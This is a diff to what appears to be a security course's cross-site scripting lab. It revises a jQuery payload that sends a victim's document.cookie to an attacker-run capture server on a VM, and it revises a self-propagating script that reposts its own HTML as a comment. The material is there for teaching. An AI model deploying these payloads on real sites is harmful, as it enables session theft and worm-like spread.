@@ -8,10 +8,9 @@ Using Javascript to steal the session ID
 
   <script>
     jQuery.post(
-      "?page=comment.php",
+      "http://<VM IP>:12344/?page=capture",
       {
-        "article_id": 1,
-        "body": "My cookies are: " + document.cookie
+        "cookies": document.cookie
       }
     )
   </script>
@@ -32,7 +31,7 @@ Extension Challenge
 
   <script class="evil-script">
     jQuery.post(
-      "?page=comment.php",
+      "http://<VM IP>:12342/?page=comment.php",
       {
         "article_id": 1,
         "body": jQuery(".evil-script").first().parent().html()
@@ -41,10 +40,10 @@ Extension Challenge
   </script>
 
 
-* ``jQuery`` can be used as a function to search the document,
+* ``jQuery`` (or ``$``) can be used as a function to search the document,
   and it returns a list of elements found using the selector string.
-  The dot (``.evil-script``) at the beginning of
-  the string is used to search for elements by class name.
+  The dot at the beginning of
+  the string (``.evil-script``) is used to search for elements by class name.
   You can learn more about this function at http://api.jquery.com/jquery/.
 
 * ``.first()`` is used to get only the first occurrence of the script,
